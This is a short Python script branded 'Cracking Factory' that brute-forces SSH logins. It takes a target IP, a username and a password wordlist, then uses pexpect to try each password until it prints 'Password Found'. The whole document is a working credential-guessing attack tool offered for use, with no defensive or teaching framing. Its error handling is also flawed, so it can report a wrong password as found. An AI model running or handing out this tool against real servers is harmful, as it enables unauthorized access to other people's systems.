import pexpect
from termcolor import colored

PROMPT = ['# ','>>> ','> ','\$ ']

def connect(user,host,password):
  ssh_newkey = 'Are you sure you want to continue connecting'
  connStr = 'ssh '+user+'@'+host
  child = pexpect.spawn(connStr)
  ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
  if ret == 0:
    print(colored("[!] Error Connecting ",'red'))
    return
  if ret == 1:
    child.sendline('yes')
    ret = child.expect([pexpect.TIMEOUT,'[P|p]assword: '])
    if ret == 0:
      print(colored('[!] Error Connecting','red'))
      return
  child.sendline(password)
  child.expect(PROMPT,timeout=0.5)
  return(child)

def main():
  banner = '''
  
 ▄▄· ▄▄▄   ▄▄▄·  ▄▄· ▄ •▄ .▄▄ · .▄▄ ·  ▄ .▄
▐█ ▌▪▀▄ █·▐█ ▀█ ▐█ ▌▪█▌▄▌▪▐█ ▀. ▐█ ▀. ██▪▐█
██ ▄▄▐▀▀▄ ▄█▀▀█ ██ ▄▄▐▀▀▄·▄▀▀▀█▄▄▀▀▀█▄██▀▐█
▐███▌▐█•█▌▐█ ▪▐▌▐███▌▐█.█▌▐█▄▪▐█▐█▄▪▐███▌▐▀
·▀▀▀ .▀  ▀ ▀  ▀ ·▀▀▀ ·▀  ▀ ▀▀▀▀  ▀▀▀▀ ▀▀▀ ·



  Cracking Factory | Secure Shell(SSH) Cracking | Linux Only
  
  [!] WARNING : You will get some error if using windows for it
  '''
  print(colored(banner,'red'))
  host = input(colored('CrackingFactory@Target~IP~#$ ','yellow'))
  user = input(colored('CrackingFactory@Username~#$ ','yellow'))
  filename = input(colored('CrackingFactory@passfile~path~#$ ','yellow'))
  print("\n")
  file = open(filename,'r')
  for password in file.readlines():
    password =  password.strip('\n')
    try:
      child = connect(user,host,password)
      print(colored("\n[+] Password Found : " + password + "\n",'green'))
      break
    except :
      print(colored("[-] Wrong Password : " + password,'red'))     